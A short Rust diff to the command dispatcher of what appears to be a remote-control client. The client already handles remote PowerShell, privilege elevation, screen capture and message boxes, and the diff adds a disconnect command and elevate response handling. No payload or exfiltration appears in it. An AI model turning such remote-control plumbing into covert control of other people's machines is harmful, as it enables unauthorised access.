@@ -4,7 +4,7 @@ use std::sync::{Arc, atomic::AtomicBool};
 
 use crate::{
     capture,
-    commands::{computer_info, elevate, message_box, powershell},
+    commands::{computer_info, elevate, message_box, powershell, disconnect},
 };
 
 pub fn send(response: BaseResponse, tx: &Sender<Vec<u8>>) {
@@ -30,7 +30,7 @@ pub fn main(
     command: BaseCommand,
     tx: Sender<Vec<u8>>,
     capture_running: Option<Arc<AtomicBool>>,
-    //enigo: Arc<Mutex<Enigo>>, // for input handling
+    //enigo: Arc<Mutex<Enigo>>, // for input handling (now handled by threading)
 ) {
     match command.command {
         Command::ComputerInfo => {
@@ -51,6 +51,21 @@ pub fn main(
         Command::Elevate => {
             send(
                 match elevate::main() {
+                    Ok(info) => BaseResponse {
+                        id: command.id,
+                        response: info,
+                    },
+                    Err(err) => BaseResponse {
+                        id: command.id,
+                        response: Response::Error(err.to_string()),
+                    },
+                },
+                &tx,
+            );
+        }
+        Command::Disconnect => {
+            send(
+                match disconnect::main() {
                     Ok(info) => BaseResponse {
                         id: command.id,
                         response: info,
